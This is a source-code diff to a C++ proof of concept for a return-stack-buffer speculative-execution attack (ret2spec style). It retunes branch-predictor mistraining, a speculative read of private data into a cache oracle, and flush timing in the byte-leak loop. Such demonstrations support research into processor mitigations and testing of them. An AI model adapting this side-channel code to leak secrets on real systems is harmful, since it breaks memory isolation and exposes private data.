@@ -78,31 +78,24 @@ static int cond = 0;
 void baz() {
   // mfence and lfence, closing speculation window
   MemoryAndSpeculationBarrier();
+  while (true) {}
 }
 
 bool bar() {
-  // Creates a stack mark and stores it to the global vector.
-  char stack_mark = 'a';
-  stack_mark_pointers.push_back(&stack_mark);
-
-  // Flush the condition variable.
-  FlushDataCacheLine(&cond);
+  // Mistrain the global BP to predict taken.
+  for (int i = 0; i < 100; i++) {}
 
   if (cond == 0) {
-      // Cleans-up its stack mark and flushes from the cache everything between its
-    // own stack mark and the next one. Somewhere there must be also the return
-    // address.
-    stack_mark_pointers.pop_back();
-    FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
-    return 1;
+    // This is copied here just to make sure speculation works.
+    // For testing ret2spec, comment this out.
+    const std::array<BigByte, 256> &oracle = *oracle_ptr;
+    ForceRead(oracle.data() +
+      static_cast<unsigned char>(private_data[current_offset]));
+
+    return true;
   }
 
-  // Cleans-up its stack mark and flushes from the cache everything between its
-  // own stack mark and the next one. Somewhere there must be also the return
-  // address.
-  stack_mark_pointers.pop_back();
-  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
-  return 0;
+  return false;
 }
 
 void foo() {
@@ -110,20 +103,18 @@ void foo() {
   char stack_mark = 'a';
   stack_mark_pointers.push_back(&stack_mark);
 
-  // For branch predictor mistraining.
-  // Bar should return true.
-  cond = 0;
-  for (int i = 0; i < 5; i++) {
-    bar();
-  }
-
   // Make the condition false and induce misspeculation.
   // Bar should return false architecturally, but our goal is to
   // make it return true speculatively.
   cond = 1;
+  
+  // Flush the condition variable and serialize.
+  // IMPORTANT: need to use the serialized function.
+  FlushDataCacheLine(&cond);
+
   if (bar()) {
     // Call to baz will push address of ForceRead's instructions on
-    // the RSB. Baz has a fence, causing speculation to fault.
+    // the RSB. Baz has a fence (or inf loop), causing speculation to fault.
     baz();
 
     // If RSB is not written under speculation, execution will not return
@@ -174,6 +165,14 @@ char Ret2AbortedCallLeakByte() {
   const std::array<BigByte, 256> &oracle = *oracle_ptr;
 
   for (int run = 0;; ++run) {
+    // For branch predictor mistraining. Bar returns true.
+    // 3 training runs suffice with the global BP trick in bar().
+    cond = 0;
+    for (int i = 0; i < 3; i++) {
+      bar();
+    }
+
+    // Clear the cache channel.
     sidechannel.FlushOracle();
 
     // Stack mark for the first call of ReturnsTrue. Otherwise it would read
